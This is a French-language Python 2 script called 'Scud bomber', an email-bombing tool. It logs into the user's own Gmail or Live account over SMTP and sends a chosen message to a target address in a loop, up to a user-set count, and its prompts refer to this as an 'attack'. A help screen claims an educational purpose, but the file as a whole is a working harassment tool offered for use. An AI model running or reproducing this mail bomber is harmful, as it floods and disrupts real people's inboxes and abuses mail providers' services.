#!/usr/bin/python

# -*- coding: utf-8 -*-
#title           :Scud bomber
#langage         :Fr
#description     :Bomber mail
#author          :KURO
#date            :24/08/2016
#version         :1.0b
#usage           :python Scud.py 
#=======================================================================

import sys, os, time
import smtplib
import string

#--- COLORS ---

END,BLUE,GREEN,RED,YELLOW='\x1b[0m', '\x1b[0;34m', '\x1b[1;32m', '\x1b[1;31m', '\x1b[1;33m'


#--- INTRO ---

def prompt(prompt):
    return string.strip(raw_input(prompt))

os.system('clear')
print

sys.stdout.write (BLUE +''' 
             .oooooo..o                             .o8       
            d8P'    `Y8                            "888       
            Y88bo.       .ooooo.  oooo  oooo   .oooo888       
             `"Y8888o.  d88' `"Y8 `888  `888  d88' `888       
                 `"Y88b 888        888   888  888   888       
            oo     .d8P 888   .o8  888   888  888   888       
            8""88888P'  `Y8bod8P'  `V88V"V8P' `Y8bod88P.
                                               '''+GREEN+'''         V.1.0b\n ''')                                                                                
time.sleep(1)

sys.stdout.write(END +'''		       =====================
 		      |  '''+BLUE+'''Scud'''+END+''' 2016 By'''+GREEN+''' KURO'''+END+'''  |
 		       ===================== 
''')

time.sleep(3)

#--- MENU ---

def index():
    os.system('clear')
    sys.stdout.write (END + '''
    ===============
   |'''+BLUE+'''  Scud'''+GREEN+''' Bomber'''+END+'''  |
    ===============\n
        M E N U 
    
    ['''+GREEN+'''1'''+END+'''] Bomber
    ['''+GREEN+'''2'''+END+'''] Help
    ['''+GREEN+'''3'''+END+'''] INFO
    ['''+RED+'''0'''+END+'''] Exit''')
    
    print
    print
    select = raw_input(' Choix: ')
    if select == '1':
        bomber()
    elif select == '2':
        help()
    elif select == '3':
        INFO()
    elif select == '0':
        OUTPROG()
    else:
        print "Selection invalide!"
        print
        index()

#--- SCUD CONFIG ---

def bomber():

    os.system("clear")
    sys.stdout.write (BLUE + '''
    
      ===============================
     |'''+END+''' Configuration du serveur mail'''+BLUE+''' |
      ==============================='''+RED+'''
    
     ######################################################################
     #                                                                    # 
     #'''+YELLOW+''' ***'''+END+''' Autorisez l'usage des applications dites moins securisees'''+RED+'''      #
     # '''+END+'''    depuis les reglages de votre boite (Gmail...)'''+YELLOW+''' *** '''+RED+'''             #
     #                                                                    #
     ######################################################################
   
     ***'''+YELLOW+''' Ctrl+C pour sortir du programme'''+RED+''' ***\n '''+END)
    print
    print" Entrez votre adresse mail ici. "
    compte_email = raw_input(" Email: ")
    print""

    print" Entrez votre mot de passe. "
    compte_password =raw_input(" MDP: ")
    print" "

    print" Entrez le mail de votre cible. "
    cible = raw_input(" Adresse cible: ")
    print" "

    print " Choisissez le nombre de message a envoye. "
    nb = raw_input(" Nombre de message: ")
    print" "

    print"Tapez ici votre message. "
    message = raw_input(" Votre message: ")

    server_disponible = ["Gmail", "Live"]
    i = 1

    for server in server_disponible:
        print " ["+str(i)+"] "+server


        i = 1+i

    server = input("Selectionnez un serveur: ")

    if(server > 0 and server <i):
        if(server_disponible[server-1] == "Gmail"):
            server = "smtp.gmail.com"
            port = 587
        elif(server_disponible[server-1] == "Live"):
            server = "smtp.live.com"
            port = 465


        send = 0
        server = smtplib.SMTP(server, port)
        server.ehlo()
        server.starttls()
        server.login(compte_email, compte_password)

            #message
        
        print "envoi"
        print""
        print" Faire Ctrl+C Pour mettre fin a l attaque! "

        email = "test@gmail.com"
        while(nb > send):
            print
            print "*** Ctrl+C pour mettre fin a l attaque!***"
            print "Scud ATTACK:"+str(send)
            msg = "From: "+compte_email+"\n"+message
            server.sendmail(compte_email, cible, message) #Mon Email, email Cible, message
            send = send+1
        server.quit()
        print "Fin"
        print "Stop ("+str(send)+")"
        index()

    else:
        os.system('clear')
	sys.stdout.write (RED + '''

        ##############################################
        #                                            #
        # '''+END+'''Aucun serveur ne correspond a la demande !'''+RED+''' #
        #                                            #
        ##############################################'''+END+'''

	Retour au menu principal Appuyez sur ['''+RED+'''Entree'''+END+''']...''')
        pause = raw_input('')
        index()
        

#--- HELP ---

def help():

    os.system('clear')
    sys.stdout.write (END + '''

             ###################################
             #                                 #
             #     *** Avertissement! ***      #
             #                                 #
             ###################################'''+RED+'''

 /!\ '''+YELLOW+'''Vous etes seuls responsable de votre facon d'utiliser ce programme.'''+RED+'''/!\ '''+END+'''

    '''+BLUE+'''S'''+END+'''cud bomber utilise les serveurs SMTP pour l'envoi massif de emails,  
    Si vous faites le bombardement d une cible sans avoir son authorisation, 
    vous risquez d avoir de serieux ennuis.
 
    * Programme a fins educatives, 
      pour montrer les caracteristiques SMTP du langage python.

     ~ KURO.

    
    Retour au menu principal Appuyez sur ['''+RED+'''Entree'''+END+''']...''')

    pause = raw_input('')
    os.system('clear')
    index()

#--- INFO ---
 
def INFO():

    os.system('clear')

    sys.stdout.write (GREEN +'''
 
  __________________________________________
 |                                          |
 |            '''+BLUE +'''Scud'''+ END +''' Bomber 1.0b'''+GREEN+'''              |
 |                                          |
 |__________________________________________|
 |                                          |
 |'''+END+'''       - By: KURO '''+GREEN+'''                        |
 |                                          |
 |'''+END+'''       - Date: 24/08/2016 '''+GREEN+'''                |
 |                                          |
 |'''+END+'''       - Version: 1.0b   '''+GREEN+'''                 |
 |                                          |
 |'''+END+'''       - Type: Python  '''+GREEN+'''                   |
 |__________________________________________|'''+END+'''

    Retour au menu principal Appuyez sur ['''+RED+'''Entree'''+END+''']...''')
    pause = raw_input('')
    os.system('clear')
    index()

#--- EXIT ---
 
def OUTPROG():

	os.system('clear')
	sys.stdout.write (GREEN+'''

	F E R M E T U R E  D E'''+BLUE+'''  S C U D'''+GREEN+'''  B O M B E R
'''+END)
	time.sleep(3)
	os.system('clear')
	sys.exit()

	
#--- START ---
 
index()

